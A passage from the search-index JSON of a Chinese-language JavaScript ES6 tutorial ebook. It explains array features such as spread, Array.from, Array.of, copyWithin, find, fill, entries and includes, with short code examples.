3]\n</code></pre> <p>Generator \u51fd\u6570\u8fd0\u884c\u540e\uff0c\u8fd4\u56de\u4e00\u4e2a\u904d\u5386\u5668\u5bf9\u8c61\uff0c\u56e0\u6b64\u4e5f\u53ef\u4ee5\u4f7f\u7528\u6269\u5c55\u8fd0\u7b97\u7b26\u3002</p> <pre><code>const go = function*(){\n  yield 1;\n  yield 2;\n  yield 3;\n};\n\n[...go()] // [1, 2, 3]\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53d8\u91cf<code>go</code>\u662f\u4e00\u4e2a Generator \u51fd\u6570\uff0c\u6267\u884c\u540e\u8fd4\u56de\u7684\u662f\u4e00\u4e2a\u904d\u5386\u5668\u5bf9\u8c61\uff0c\u5bf9\u8fd9\u4e2a\u904d\u5386\u5668\u5bf9\u8c61\u6267\u884c\u6269\u5c55\u8fd0\u7b97\u7b26\uff0c\u5c31\u4f1a\u5c06\u5185\u90e8\u904d\u5386\u5f97\u5230\u7684\u503c\uff0c\u8f6c\u4e3a\u4e00\u4e2a\u6570\u7ec4\u3002</p> <p>\u5982\u679c\u5bf9\u6ca1\u6709 Iterator \u63a5\u53e3\u7684\u5bf9\u8c61\uff0c\u4f7f\u7528\u6269\u5c55\u8fd0\u7b97\u7b26\uff0c\u5c06\u4f1a\u62a5\u9519\u3002</p> <pre><code>const obj = {a: 1, b: 2};\nlet arr = [...obj]; // TypeError: Cannot spread non-iterable object \n</code></pre>"},{"location":"ebook-JSES6-RYF/09-%E6%95%B0%E7%BB%84/#arrayfrom","title":"Array.from()","text":"<p><code>Array.from</code>\u7528\u4e8e\u5c06\u4e24\u7c7b\u5bf9\u8c61\u8f6c\u4e3a\u771f\u6b63\u7684\u6570\u7ec4\uff1a\u4f2a\u6570\u7ec4\uff08array-like object\uff09\u548c\u53ef\u904d\u5386\u7684\u5bf9\u8c61\uff08 Set \u548c Map\uff09\u3002</p> <p>\u4e0b\u9762\u662f\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c<code>Array.from</code>\u5c06\u5b83\u8f6c\u4e3a\u771f\u6b63\u7684\u6570\u7ec4\u3002</p> <pre><code>let arrayLike = {\n    '0': 'a',\n    '1': 'b',\n    '2': 'c',\n    length: 3\n};\n\n// ES5\u7684\u5199\u6cd5\nvar arr1 = [].slice.call(arrayLike); // ['a', 'b', 'c']\n\n// ES6\u7684\u5199\u6cd5\nlet arr2 = Array.from(arrayLike); // ['a', 'b', 'c']\n</code></pre> <p>\u5b9e\u9645\u5e94\u7528\u4e2d\uff0c\u5e38\u89c1\u7684\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\u662f DOM \u64cd\u4f5c\u8fd4\u56de\u7684 NodeList \u96c6\u5408\uff0c\u4ee5\u53ca\u51fd\u6570\u5185\u90e8\u7684<code>arguments</code>\u5bf9\u8c61\u3002<code>Array.from</code>\u90fd\u53ef\u4ee5\u5c06\u5b83\u4eec\u8f6c\u4e3a\u771f\u6b63\u7684\u6570\u7ec4\u3002</p> <pre><code>// NodeList\u5bf9\u8c61\nlet ps = document.querySelectorAll('p');\nArray.from(ps).filter(p =&gt; {\n  return p.textContent.length &gt; 100;\n});\n\n// arguments\u5bf9\u8c61\nfunction foo() {\n  var args = Array.from(arguments);\n  // ...\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>querySelectorAll</code>\u65b9\u6cd5\u8fd4\u56de\u7684\u662f\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u53ef\u4ee5\u5c06\u8fd9\u4e2a\u5bf9\u8c61\u8f6c\u4e3a\u771f\u6b63\u7684\u6570\u7ec4\uff0c\u518d\u4f7f\u7528<code>filter</code>\u65b9\u6cd5\u3002</p> <p>\u53ea\u8981\u662f\u90e8\u7f72\u4e86 Iterator \u63a5\u53e3\u7684\u6570\u636e\u7ed3\u6784\uff0c<code>Array.from</code>\u90fd\u80fd\u5c06\u5176\u8f6c\u4e3a\u6570\u7ec4\u3002</p> <pre><code>Array.from('hello')\n// ['h', 'e', 'l', 'l', 'o']\n\nlet namesSet = new Set(['a', 'b'])\nArray.from(namesSet) // ['a', 'b']\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b57\u7b26\u4e32\u548c Set \u7ed3\u6784\u90fd\u5177\u6709 Iterator \u63a5\u53e3\uff0c\u56e0\u6b64\u53ef\u4ee5\u88ab<code>Array.from</code>\u8f6c\u4e3a\u771f\u6b63\u7684\u6570\u7ec4\u3002</p> <p>\u5982\u679c\u53c2\u6570\u662f\u4e00\u4e2a\u771f\u6b63\u7684\u6570\u7ec4\uff0c<code>Array.from</code>\u4f1a\u8fd4\u56de\u4e00\u4e2a\u4e00\u6a21\u4e00\u6837\u7684\u65b0\u6570\u7ec4\u3002</p> <pre><code>Array.from([1, 2, 3])\n// [1, 2, 3]\n</code></pre> <p>\u503c\u5f97\u63d0\u9192\u7684\u662f\uff0c\u6269\u5c55\u8fd0\u7b97\u7b26\uff08<code>...</code>\uff09\u4e5f\u53ef\u4ee5\u5c06\u67d0\u4e9b\u6570\u636e\u7ed3\u6784\u8f6c\u4e3a\u6570\u7ec4\u3002</p> <pre><code>// arguments\u5bf9\u8c61\nfunction foo() {\n  const args = [...arguments];\n}\n\n// NodeList\u5bf9\u8c61\n[...document.querySelectorAll('div')]\n</code></pre> <p>\u6269\u5c55\u8fd0\u7b97\u7b26\u80cc\u540e\u8c03\u7528\u7684\u662f\u904d\u5386\u5668\u63a5\u53e3\uff08<code>Symbol.iterator</code>\uff09\uff0c\u5982\u679c\u4e00\u4e2a\u5bf9\u8c61\u6ca1\u6709\u90e8\u7f72\u8fd9\u4e2a\u63a5\u53e3\uff0c\u5c31\u65e0\u6cd5\u8f6c\u6362\u3002<code>Array.from</code>\u65b9\u6cd5\u8fd8\u652f\u6301\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\u3002\u6240\u8c13\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u672c\u8d28\u7279\u5f81\u53ea\u6709\u4e00\u70b9\uff0c\u5373\u5fc5\u987b\u6709<code>length</code>\u5c5e\u6027\u3002\u56e0\u6b64\uff0c\u4efb\u4f55\u6709<code>length</code>\u5c5e\u6027\u7684\u5bf9\u8c61\uff0c\u90fd\u53ef\u4ee5\u901a\u8fc7<code>Array.from</code>\u65b9\u6cd5\u8f6c\u4e3a\u6570\u7ec4\uff0c\u800c\u6b64\u65f6\u6269\u5c55\u8fd0\u7b97\u7b26\u5c31\u65e0\u6cd5\u8f6c\u6362\u3002</p> <pre><code>Array.from({ length: 3 });\n// [ undefined, undefined, undefined ]\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>Array.from</code>\u8fd4\u56de\u4e86\u4e00\u4e2a\u5177\u6709\u4e09\u4e2a\u6210\u5458\u7684\u6570\u7ec4\uff0c\u6bcf\u4e2a\u4f4d\u7f6e\u7684\u503c\u90fd\u662f<code>undefined</code>\u3002\u6269\u5c55\u8fd0\u7b97\u7b26\u8f6c\u6362\u4e0d\u4e86\u8fd9\u4e2a\u5bf9\u8c61\u3002</p> <p>\u5bf9\u4e8e\u8fd8\u6ca1\u6709\u90e8\u7f72\u8be5\u65b9\u6cd5\u7684\u6d4f\u89c8\u5668\uff0c\u53ef\u4ee5\u7528<code>Array.prototype.slice</code>\u65b9\u6cd5\u66ff\u4ee3\u3002</p> <pre><code>const toArray = (() =&gt;\n  Array.from ? Array.from : obj =&gt; [].slice.call(obj)\n)();\n</code></pre> <p><code>Array.from</code>\u8fd8\u53ef\u4ee5\u63a5\u53d7\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u4f5c\u7528\u7c7b\u4f3c\u4e8e\u6570\u7ec4\u7684<code>map</code>\u65b9\u6cd5\uff0c\u7528\u6765\u5bf9\u6bcf\u4e2a\u5143\u7d20\u8fdb\u884c\u5904\u7406\uff0c\u5c06\u5904\u7406\u540e\u7684\u503c\u653e\u5165\u8fd4\u56de\u7684\u6570\u7ec4\u3002\u7b2c\u4e8c\u4e2a\u53c2\u6570\u5728\u8d2a\u5403\u86c7\u7b97\u6cd5\u4e2d\u53ef\u4ee5\u4f53\u73b0\uff08from\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u6784\u5efa\u4e00\u4e2a\u4e00\u7ef4\u6570\u7ec4\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4f7f\u7528\u7bad\u5934\u51fd\u6570\u5904\u7406\uff0c\u521b\u5efa\u4e00\u4e2a\u4e8c\u7ef4\u6570\u7ec4\uff0c\u4e4b\u540e\u904d\u5386\u8fd9\u4e2a\u4e8c\u7ef4\u6570\u7ec4\uff0c\u8bbe\u7f6e\u6bcf\u4e00\u4e2a\u5143\u7d20\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u4fdd\u5b58\u8fd9\u4e2a\u5143\u7d20\u7684\u884c\u5217\u53f7\u548c\u8fd9\u4e2a\u5355\u5143\u683c\u7684\u5c5e\u6027\uff09</p> <pre><code>Array.from(arrayLike, x =&gt; x * x);\n// \u7b49\u540c\u4e8e\nArray.from(arrayLike).map(x =&gt; x * x);\n\nArray.from([1, 2, 3], (x) =&gt; x * x)\n// [1, 4, 9]\n</code></pre> <p>\u4e0b\u9762\u7684\u4f8b\u5b50\u662f\u53d6\u51fa\u4e00\u7ec4 DOM \u8282\u70b9\u7684\u6587\u672c\u5185\u5bb9\u3002</p> <pre><code>let spans = document.querySelectorAll('span.name');\nlet names1 = Array.prototype.map.call(spans, s =&gt; s.textContent);\nlet names2 = Array.from(spans, s =&gt; s.textContent)\n</code></pre> <p>\u4e0b\u9762\u7684\u4f8b\u5b50\u5c06\u6570\u7ec4\u4e2d\u5e03\u5c14\u503c\u4e3a<code>false</code>\u7684\u6210\u5458\u8f6c\u4e3a<code>0</code>\u3002</p> <pre><code>Array.from([1, , 2, , 3], (n) =&gt; n || 0)\n// [1, 0, 2, 0, 3]\n</code></pre> <p>\u53e6\u4e00\u4e2a\u4f8b\u5b50\u662f\u8fd4\u56de\u5404\u79cd\u6570\u636e\u7684\u7c7b\u578b\u3002</p> <pre><code>function typesOf () {\n  return Array.from(arguments, value =&gt; typeof value)\n}\ntypesOf(null, [], NaN)\n// ['object', 'object', 'number']\n</code></pre> <p>\u5982\u679c<code>map</code>\u51fd\u6570\u91cc\u9762\u7528\u5230\u4e86<code>this</code>\u5173\u952e\u5b57\uff0c\u8fd8\u53ef\u4ee5\u4f20\u5165<code>Array.from</code>\u7684\u7b2c\u4e09\u4e2a\u53c2\u6570\uff0c\u7528\u6765\u7ed1\u5b9a<code>this</code>\u3002</p> <p><code>Array.from()</code>\u53ef\u4ee5\u5c06\u5404\u79cd\u503c\u8f6c\u4e3a\u771f\u6b63\u7684\u6570\u7ec4\uff0c\u5e76\u4e14\u8fd8\u63d0\u4f9b<code>map</code>\u529f\u80fd\u3002\u8fd9\u5b9e\u9645\u4e0a\u610f\u5473\u7740\uff0c\u53ea\u8981\u6709\u4e00\u4e2a\u539f\u59cb\u7684\u6570\u636e\u7ed3\u6784\uff0c\u4f60\u5c31\u53ef\u4ee5\u5148\u5bf9\u5b83\u7684\u503c\u8fdb\u884c\u5904\u7406\uff0c\u7136\u540e\u8f6c\u6210\u89c4\u8303\u7684\u6570\u7ec4\u7ed3\u6784\uff0c\u8fdb\u800c\u5c31\u53ef\u4ee5\u4f7f\u7528\u6570\u91cf\u4f17\u591a\u7684\u6570\u7ec4\u65b9\u6cd5\u3002</p> <pre><code>Array.from({ length: 2 }, () =&gt; 'jack')\n// ['jack', 'jack']\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>Array.from</code>\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u6307\u5b9a\u4e86\u7b2c\u4e8c\u4e2a\u53c2\u6570\u8fd0\u884c\u7684\u6b21\u6570\u3002\u8fd9\u79cd\u7279\u6027\u53ef\u4ee5\u8ba9\u8be5\u65b9\u6cd5\u7684\u7528\u6cd5\u53d8\u5f97\u975e\u5e38\u7075\u6d3b\u3002</p> <p><code>Array.from()</code>\u7684\u53e6\u4e00\u4e2a\u5e94\u7528\u662f\uff0c\u5c06\u5b57\u7b26\u4e32\u8f6c\u4e3a\u6570\u7ec4\uff0c\u7136\u540e\u8fd4\u56de\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\u3002\u56e0\u4e3a\u5b83\u80fd\u6b63\u786e\u5904\u7406\u5404\u79cd Unicode \u5b57\u7b26\uff0c\u53ef\u4ee5\u907f\u514d JavaScript \u5c06\u5927\u4e8e<code>\\uFFFF</code>\u7684 Unicode \u5b57\u7b26\uff0c\u7b97\u4f5c\u4e24\u4e2a\u5b57\u7b26\u7684 bug\u3002</p> <pre><code>function countSymbols(string) {\n  return Array.from(string).length;\n}\n</code></pre>"},{"location":"ebook-JSES6-RYF/09-%E6%95%B0%E7%BB%84/#arrayof","title":"Array.of()","text":"<p><code>Array.of</code>\u65b9\u6cd5\u7528\u4e8e\u5c06\u4e00\u7ec4\u503c\uff0c\u8f6c\u6362\u4e3a\u6570\u7ec4\u3002</p> <pre><code>ti // [3,11,8]\nArray.of(3) // [3]\nArray.of(3).length // 1\n</code></pre> <p>\u8fd9\u4e2a\u65b9\u6cd5\u7684\u4e3b\u8981\u76ee\u7684\uff0c\u662f\u5f25\u8865\u6570\u7ec4\u6784\u9020\u51fd\u6570<code>Array()</code>\u7684\u4e0d\u8db3\u3002\u56e0\u4e3a\u53c2\u6570\u4e2a\u6570\u7684\u4e0d\u540c\uff0c\u4f1a\u5bfc\u81f4<code>Array()</code>\u7684\u884c\u4e3a\u6709\u5dee\u5f02\u3002</p> <pre><code>Array() // []\nArray(3) // [, , ,]\nArray(3, 11, 8) // [3, 11, 8]\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>Array</code>\u65b9\u6cd5\u6ca1\u6709\u53c2\u6570\u3001\u4e00\u4e2a\u53c2\u6570\u3001\u4e09\u4e2a\u53c2\u6570\u65f6\uff0c\u8fd4\u56de\u7ed3\u679c\u90fd\u4e0d\u4e00\u6837\u3002\u53ea\u6709\u5f53\u53c2\u6570\u4e2a\u6570\u4e0d\u5c11\u4e8e 2 \u4e2a\u65f6\uff0c<code>Array()</code>\u624d\u4f1a\u8fd4\u56de\u7531\u53c2\u6570\u7ec4\u6210\u7684\u65b0\u6570\u7ec4\u3002\u53c2\u6570\u4e2a\u6570\u53ea\u6709\u4e00\u4e2a\u65f6\uff0c\u5b9e\u9645\u4e0a\u662f\u6307\u5b9a\u6570\u7ec4\u7684\u957f\u5ea6\u3002</p> <p><code>Array.of</code>\u57fa\u672c\u4e0a\u53ef\u4ee5\u7528\u6765\u66ff\u4ee3<code>Array()</code>\u6216<code>new Array()</code>\uff0c\u5e76\u4e14\u4e0d\u5b58\u5728\u7531\u4e8e\u53c2\u6570\u4e0d\u540c\u800c\u5bfc\u81f4\u7684\u91cd\u8f7d\u3002\u5b83\u7684\u884c\u4e3a\u975e\u5e38\u7edf\u4e00\u3002</p> <pre><code>Array.of() // []\nArray.of(undefined) // [undefined]\nArray.of(1) // [1]\nArray.of(1, 2) // [1, 2]\n</code></pre> <p><code>Array.of</code>\u603b\u662f\u8fd4\u56de\u53c2\u6570\u503c\u7ec4\u6210\u7684\u6570\u7ec4\u3002\u5982\u679c\u6ca1\u6709\u53c2\u6570\uff0c\u5c31\u8fd4\u56de\u4e00\u4e2a\u7a7a\u6570\u7ec4\u3002</p> <p><code>Array.of</code>\u65b9\u6cd5\u53ef\u4ee5\u7528\u4e0b\u9762\u7684\u4ee3\u7801\u6a21\u62df\u5b9e\u73b0\u3002</p> <pre><code>function ArrayOf(){\n  return [].slice.call(arguments);\n}\n</code></pre>"},{"location":"ebook-JSES6-RYF/09-%E6%95%B0%E7%BB%84/#copywithin","title":"\u6570\u7ec4\u5b9e\u4f8b\u7684 copyWithin()","text":"<p>\u6570\u7ec4\u5b9e\u4f8b\u7684<code>copyWithin()</code>\u65b9\u6cd5\uff0c\u5728\u5f53\u524d\u6570\u7ec4\u5185\u90e8\uff0c\u5c06\u6307\u5b9a\u4f4d\u7f6e\u7684\u6210\u5458\u590d\u5236\u5230\u5176\u4ed6\u4f4d\u7f6e\uff08\u4f1a\u8986\u76d6\u539f\u6709\u6210\u5458\uff09\uff0c\u7136\u540e\u8fd4\u56de\u5f53\u524d\u6570\u7ec4\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u4f7f\u7528\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u4f1a\u4fee\u6539\u5f53\u524d\u6570\u7ec4\u3002</p> <pre><code>Array.prototype.copyWithin(target, start = 0, end = this.length)\n</code></pre> <p>\u5b83\u63a5\u53d7\u4e09\u4e2a\u53c2\u6570\u3002</p> <ul> <li>target\uff08\u5fc5\u9700\uff09\uff1a\u4ece\u8be5\u4f4d\u7f6e\u5f00\u59cb\u66ff\u6362\u6570\u636e\u3002\u5982\u679c\u4e3a\u8d1f\u503c\uff0c\u8868\u793a\u5012\u6570\u3002</li> <li>start\uff08\u53ef\u9009\uff09\uff1a\u4ece\u8be5\u4f4d\u7f6e\u5f00\u59cb\u8bfb\u53d6\u6570\u636e\uff0c\u9ed8\u8ba4\u4e3a 0\u3002\u5982\u679c\u4e3a\u8d1f\u503c\uff0c\u8868\u793a\u4ece\u672b\u5c3e\u5f00\u59cb\u8ba1\u7b97\u3002</li> <li>end\uff08\u53ef\u9009\uff09\uff1a\u5230\u8be5\u4f4d\u7f6e\u524d\u505c\u6b62\u8bfb\u53d6\u6570\u636e\uff0c\u9ed8\u8ba4\u7b49\u4e8e\u6570\u7ec4\u957f\u5ea6\u3002\u5982\u679c\u4e3a\u8d1f\u503c\uff0c\u8868\u793a\u4ece\u672b\u5c3e\u5f00\u59cb\u8ba1\u7b97\u3002</li> </ul> <p>\u8fd9\u4e09\u4e2a\u53c2\u6570\u90fd\u5e94\u8be5\u662f\u6570\u503c\uff0c\u5982\u679c\u4e0d\u662f\uff0c\u4f1a\u81ea\u52a8\u8f6c\u4e3a\u6570\u503c\u3002</p> <pre><code>[1, 2, 3, 4, 5].copyWithin(0, 3)\n// [4, 5, 3, 4, 5]\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u8868\u793a\u5c06\u4ece 3 \u53f7\u4f4d\u76f4\u5230\u6570\u7ec4\u7ed3\u675f\u7684\u6210\u5458\uff084 \u548c 5\uff09\uff0c\u590d\u5236\u5230\u4ece 0 \u53f7\u4f4d\u5f00\u59cb\u7684\u4f4d\u7f6e\uff0c\u7ed3\u679c\u8986\u76d6\u4e86\u539f\u6765\u7684 1 \u548c 2\u3002</p> <p>\u4e0b\u9762\u662f\u66f4\u591a\u4f8b\u5b50\u3002</p> <pre><code>// \u5c063\u53f7\u4f4d\u590d\u5236\u52300\u53f7\u4f4d\n[1, 2, 3, 4, 5].copyWithin(0, 3, 4)\n// [4, 2, 3, 4, 5]\n\n// -2\u76f8\u5f53\u4e8e3\u53f7\u4f4d\uff0c-1\u76f8\u5f53\u4e8e4\u53f7\u4f4d\n[1, 2, 3, 4, 5].copyWithin(0, -2, -1)\n// [4, 2, 3, 4, 5]\n\n// \u5c063\u53f7\u4f4d\u590d\u5236\u52300\u53f7\u4f4d\n[].copyWithin.call({length: 5, 3: 1}, 0, 3)\n// {0: 1, 3: 1, length: 5}\n\n// \u5c062\u53f7\u4f4d\u5230\u6570\u7ec4\u7ed3\u675f\uff0c\u590d\u5236\u52300\u53f7\u4f4d\nlet i32a = new Int32Array([1, 2, 3, 4, 5]);\ni32a.copyWithin(0, 2);\n// Int32Array [3, 4, 5, 4, 5]\n\n// \u5bf9\u4e8e\u6ca1\u6709\u90e8\u7f72 TypedArray \u7684 copyWithin \u65b9\u6cd5\u7684\u5e73\u53f0\n// \u9700\u8981\u91c7\u7528\u4e0b\u9762\u7684\u5199\u6cd5\n[].copyWithin.call(new Int32Array([1, 2, 3, 4, 5]), 0, 3, 4);\n// Int32Array [4, 2, 3, 4, 5]\n</code></pre>"},{"location":"ebook-JSES6-RYF/09-%E6%95%B0%E7%BB%84/#find-findindex","title":"\u6570\u7ec4\u5b9e\u4f8b\u7684 find() \u548c findIndex()","text":"<p>\u6570\u7ec4\u5b9e\u4f8b\u7684<code>find</code>\u65b9\u6cd5\uff0c\u7528\u4e8e\u627e\u51fa\u7b2c\u4e00\u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u6570\u7ec4\u6210\u5458\u3002\u5b83\u7684\u53c2\u6570\u662f\u4e00\u4e2a\u56de\u8c03\u51fd\u6570\uff0c\u6240\u6709\u6570\u7ec4\u6210\u5458\u4f9d\u6b21\u6267\u884c\u8be5\u56de\u8c03\u51fd\u6570\uff0c\u76f4\u5230\u627e\u51fa\u7b2c\u4e00\u4e2a\u8fd4\u56de\u503c\u4e3a<code>true</code>\u7684\u6210\u5458\uff0c\u7136\u540e\u8fd4\u56de\u8be5\u6210\u5458\u3002\u5982\u679c\u6ca1\u6709\u7b26\u5408\u6761\u4ef6\u7684\u6210\u5458\uff0c\u5219\u8fd4\u56de<code>undefined</code>\u3002</p> <pre><code>[1, 4, -5, 10].find((n) =&gt; n &lt; 0)\n// -5\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u627e\u51fa\u6570\u7ec4\u4e2d\u7b2c\u4e00\u4e2a\u5c0f\u4e8e 0 \u7684\u6210\u5458\u3002</p> <pre><code>[1, 5, 10, 15].find(function(value, index, arr) {\n  return value &gt; 9;\n}) // 10\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>find</code>\u65b9\u6cd5\u7684\u56de\u8c03\u51fd\u6570\u53ef\u4ee5\u63a5\u53d7\u4e09\u4e2a\u53c2\u6570\uff0c\u4f9d\u6b21\u4e3a\u5f53\u524d\u7684\u503c\u3001\u5f53\u524d\u7684\u4f4d\u7f6e\u548c\u539f\u6570\u7ec4\u3002</p> <p>\u6570\u7ec4\u5b9e\u4f8b\u7684<code>findIndex</code>\u65b9\u6cd5\u7684\u7528\u6cd5\u4e0e<code>find</code>\u65b9\u6cd5\u975e\u5e38\u7c7b\u4f3c\uff0c\u8fd4\u56de\u7b2c\u4e00\u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u6570\u7ec4\u6210\u5458\u7684\u4f4d\u7f6e\uff0c\u5982\u679c\u6240\u6709\u6210\u5458\u90fd\u4e0d\u7b26\u5408\u6761\u4ef6\uff0c\u5219\u8fd4\u56de<code>-1</code>\u3002</p> <pre><code>[1, 5, 10, 15].findIndex(function(value, index, arr) {\n  return value &gt; 9;\n}) // 2\n</code></pre> <p>\u8fd9\u4e24\u4e2a\u65b9\u6cd5\u90fd\u53ef\u4ee5\u63a5\u53d7\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u7528\u6765\u7ed1\u5b9a\u56de\u8c03\u51fd\u6570\u7684<code>this</code>\u5bf9\u8c61\u3002</p> <pre><code>function f(v){\n  return v &gt; this.age;\n}\nlet person = {name: 'John', age: 20};\n[10, 12, 26, 15].find(f, person);    // 26\n</code></pre> <p>\u4e0a\u9762\u7684\u4ee3\u7801\u4e2d\uff0c<code>find</code>\u51fd\u6570\u63a5\u6536\u4e86\u7b2c\u4e8c\u4e2a\u53c2\u6570<code>person</code>\u5bf9\u8c61\uff0c\u56de\u8c03\u51fd\u6570\u4e2d\u7684<code>this</code>\u5bf9\u8c61\u6307\u5411<code>person</code>\u5bf9\u8c61\u3002</p> <p>\u53e6\u5916\uff0c\u8fd9\u4e24\u4e2a\u65b9\u6cd5\u90fd\u53ef\u4ee5\u53d1\u73b0<code>NaN</code>\uff0c\u5f25\u8865\u4e86\u6570\u7ec4\u7684<code>indexOf</code>\u65b9\u6cd5\u7684\u4e0d\u8db3\u3002</p> <pre><code>[NaN].indexOf(NaN)\n// -1\n\n[NaN].findIndex(y =&gt; Object.is(NaN, y))\n// 0\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>indexOf</code>\u65b9\u6cd5\u65e0\u6cd5\u8bc6\u522b\u6570\u7ec4\u7684<code>NaN</code>\u6210\u5458\uff0c\u4f46\u662f<code>findIndex</code>\u65b9\u6cd5\u53ef\u4ee5\u501f\u52a9<code>Object.is</code>\u65b9\u6cd5\u505a\u5230\u3002</p>"},{"location":"ebook-JSES6-RYF/09-%E6%95%B0%E7%BB%84/#fill","title":"\u6570\u7ec4\u5b9e\u4f8b\u7684 fill()","text":"<p><code>fill</code>\u65b9\u6cd5\u4f7f\u7528\u7ed9\u5b9a\u503c\uff0c\u586b\u5145\u4e00\u4e2a\u6570\u7ec4\u3002</p> <pre><code>['a', 'b', 'c'].fill(7)\n// [7, 7, 7]\n\nnew Array(3).fill(7)\n// [7, 7, 7]\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u8868\u660e\uff0c<code>fill</code>\u65b9\u6cd5\u7528\u4e8e\u7a7a\u6570\u7ec4\u7684\u521d\u59cb\u5316\u975e\u5e38\u65b9\u4fbf\u3002\u6570\u7ec4\u4e2d\u5df2\u6709\u7684\u5143\u7d20\uff0c\u4f1a\u88ab\u5168\u90e8\u62b9\u53bb\u3002</p> <p><code>fill</code>\u65b9\u6cd5\u8fd8\u53ef\u4ee5\u63a5\u53d7==\u7b2c\u4e8c\u4e2a\u548c\u7b2c\u4e09\u4e2a\u53c2\u6570\uff0c\u7528\u4e8e\u6307\u5b9a\u586b\u5145\u7684\u8d77\u59cb\u4f4d\u7f6e\u548c\u7ed3\u675f\u4f4d\u7f6e==\u3002</p> <pre><code>['a', 'b', 'c'].fill(7, 1, 2)\n// ['a', 7, 'c']\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c<code>fill</code>\u65b9\u6cd5\u4ece 1 \u53f7\u4f4d\u5f00\u59cb\uff0c\u5411\u539f\u6570\u7ec4\u586b\u5145 7\uff0c\u5230 2 \u53f7\u4f4d\u4e4b\u524d\u7ed3\u675f\u3002</p> <p>\u6ce8\u610f\uff0c\u5982\u679c\u586b\u5145\u7684\u7c7b\u578b\u4e3a\u5bf9\u8c61\uff0c\u90a3\u4e48\u88ab\u8d4b\u503c\u7684\u662f\u540c\u4e00\u4e2a\u5185\u5b58\u5730\u5740\u7684\u5bf9\u8c61\uff0c\u800c\u4e0d\u662f\u6df1\u62f7\u8d1d\u5bf9\u8c61\u3002</p> <pre><code>let arr = new Array(3).fill({name: \"Mike\"});\narr[0].name = \"Ben\";\narr\n// [{name: \"Ben\"}, {name: \"Ben\"}, {name: \"Ben\"}]\n\nlet arr = new Array(3).fill([]);\narr[0].push(5);\narr\n// [[5], [5], [5]]\n</code></pre>"},{"location":"ebook-JSES6-RYF/09-%E6%95%B0%E7%BB%84/#entrieskeys-values","title":"\u6570\u7ec4\u5b9e\u4f8b\u7684 entries()\uff0ckeys() \u548c values()","text":"<p>ES6 \u63d0\u4f9b\u4e09\u4e2a\u65b0\u7684\u65b9\u6cd5\u2014\u2014<code>entries()</code>\uff0c<code>keys()</code>\u548c<code>values()</code>\u2014\u2014\u7528\u4e8e\u904d\u5386\u6570\u7ec4\u3002\u5b83\u4eec\u90fd\u8fd4\u56de\u4e00\u4e2a\u904d\u5386\u5668\u5bf9\u8c61\uff08\u8be6\u89c1\u300aIterator\u300b\u4e00\u7ae0\uff09\uff0c\u53ef\u4ee5\u7528<code>for...of</code>\u5faa\u73af\u8fdb\u884c\u904d\u5386\uff0c\u552f\u4e00\u7684\u533a\u522b\u662f<code>keys()</code>\u662f\u5bf9\u952e\u540d\u7684\u904d\u5386\u3001<code>values()</code>\u662f\u5bf9\u952e\u503c\u7684\u904d\u5386\uff0c<code>entries()</code>\u662f\u5bf9\u952e\u503c\u5bf9\u7684\u904d\u5386\u3002</p> <pre><code>for (let index of ['a', 'b'].keys()) {\n  console.log(index);\n}\n// 0\n// 1\n\nfor (let elem of ['a', 'b'].values()) {\n  console.log(elem);\n}\n// 'a'\n// 'b'\n\nfor (let [index, elem] of ['a', 'b'].entries()) {\n  console.log(index, elem);\n}\n// 0 \"a\"\n// 1 \"b\"\n</code></pre> <p>\u5982\u679c\u4e0d\u4f7f\u7528<code>for...of</code>\u5faa\u73af\uff0c\u53ef\u4ee5\u624b\u52a8\u8c03\u7528\u904d\u5386\u5668\u5bf9\u8c61\u7684<code>next</code>\u65b9\u6cd5\uff0c\u8fdb\u884c\u904d\u5386\u3002</p> <pre><code>let letter = ['a', 'b', 'c'];\nlet entries = letter.entries();\nconsole.log(entries.next().value); // [0, 'a']\nconsole.log(entries.next().value); // [1, 'b']\nconsole.log(entries.next().value); // [2, 'c']\n</code></pre>"},{"location":"ebook-JSES6-RYF/09-%E6%95%B0%E7%BB%84/#includes","title":"\u6570\u7ec4\u5b9e\u4f8b\u7684 includes()","text":"<p><code>Array.prototype.includes</code>\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u67d0\u4e2a\u6570\u7ec4\u662f\u5426\u5305\u542b\u7ed9\u5b9a\u7684\u503c\uff0c\u4e0e\u5b57\u7b26\u4e32\u7684<code>includes</code>\u65b9\u6cd5\u7c7b\u4f3c\u3002ES2016 \u5f15\u5165\u4e86\u8be5\u65b9\u6cd5\u3002</p> <pre><code>[1, 2, 3].includes(2)     // true\n[1, 2, 3].includes(4)     // false\n[1, 2, NaN].includes(NaN) // true\n</code></pre> 